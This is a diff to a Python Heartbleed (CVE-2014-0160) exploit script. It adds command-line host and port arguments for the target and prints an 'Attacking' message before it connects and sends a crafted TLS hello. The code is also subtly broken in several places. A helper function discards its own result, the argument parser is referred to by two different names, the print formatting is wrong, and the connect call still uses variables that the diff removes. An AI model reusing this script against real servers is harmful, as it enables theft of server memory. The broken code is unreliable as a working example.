@@ -7,11 +7,17 @@ import ssl
 import sys
 import pyfancy
 import codecs
+import argparse
 
 def h2bin(x):
     x.replace(' ', '').replace('\n', '')
     x = codecs.getdecoder('hex_codec')
     return x
+
+parse = argparse.ArgumentParser(description='Heartbleed exploit/OpenSSL vulnerability/CVE-2014-0160')
+parse.add_argument('host',help='Target host IP',type=str)
+parse.add_argument('port',help='Port number',type=int)
+args = parser.parse_args()
 
 hello = h2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -91,9 +97,7 @@ if __name__ =='__main__':
 
     s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 
-    in_1 = input("Host: ")
-    in_2 = input("Port: ")
-    print("Connecting to host:" ,in_1 ,"on port:" ,in_2)
+    print("Attacking %s on port %s",args.host,args.port)
     s.connect((in_1 , int(in_2)))
     print("Sending hello to the server")
     s.send(hello)
